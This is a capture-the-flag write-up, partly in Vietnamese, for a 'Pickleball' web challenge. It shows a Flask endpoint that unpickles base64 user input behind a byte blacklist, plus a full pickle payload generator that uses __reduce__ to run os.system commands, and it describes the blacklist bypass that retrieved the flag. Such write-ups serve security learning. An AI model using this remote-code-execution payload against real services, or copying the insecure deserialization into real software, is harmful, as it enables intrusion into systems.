# Pickleball

```python!
@app.route("/process", methods=["GET", "POST"])
def process():
    if "username" not in session:
        return redirect(url_for("login"))

    error = None
    disassembled_output = None

    banned_patterns = [b"\\", b"static", b"templates", b"flag.txt", b">", b"/", b"."]
    banned_instruction = "REDUCE"

    if request.method == "POST":
        payload = request.form.get("payload", "")
        try:
            decoded_data = base64.b64decode(payload)

            for pattern in banned_patterns:
                if pattern in decoded_data:
                    raise ValueError("Payload contains banned characters!")

            try:
                output = io.StringIO()
                pickletools.dis(decoded_data, out=output)
                disassembled_output = output.getvalue()

                if banned_instruction in disassembled_output:
                    raise ValueError(
                        f"Payload contains banned instruction: {banned_instruction}"
                    )

            except Exception as e:
                disassembled_output = "Error!"

            pickle.loads(decoded_data)

        except Exception as e:
            error = str(e)

    return render_template(
        "process.html", error=error, disassembled_output=disassembled_output
    )
```

- đoạn code dùng pickle để deserialize dữ liệu đầu vào của người dùng
- và có blacklist 1 số từ khóa
- gen payload https://github.com/shafdo/pickle-payload-gen-python3

```python!
#!/bin/python3

import pickle,base64,os,sys

try:
	if(sys.argv[1] == "--help" or sys.argv[1] == "-h"):
		print("""\nUSAGE\n=====\n./pickle-payload-gen.py <payload>\n""")
		sys.exit()

	command = sys.argv[1]

except IndexError:
	print("\n[-] No payload specified sticking with default payload => id\n")
	command = "id"


class PAYLOAD():
	def __reduce__(self):
		return os.system, ("{}".format(command),)

b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")

print("Payload (Base64) => {}".format(b64Encoded))
```

## test local

![image](https://hackmd.io/_uploads/r1QjqCK4yl.png)

![image](https://hackmd.io/_uploads/B18NcCtE1l.png)

![image](https://hackmd.io/_uploads/rJFr5AtNJl.png)

## khai thác web

![image](https://hackmd.io/_uploads/SyiLmL9Vkl.png)

- xóa bỏ dấu "." để không bị ban trong blacklist và mình gửi request

![image](https://hackmd.io/_uploads/rkgdmL94yx.png)

- sau đó truy cập `http://3ada52375b5f3f47b8af70804b123d15.chall.w1playground.com:8082/static/css/flag` để lấy flag

![image](https://hackmd.io/_uploads/r1gEQI9V1g.png)

flag: `W1{do_you_wanna_play_pickleball?_fabe024ba700d99bf696871da940cdb3}`
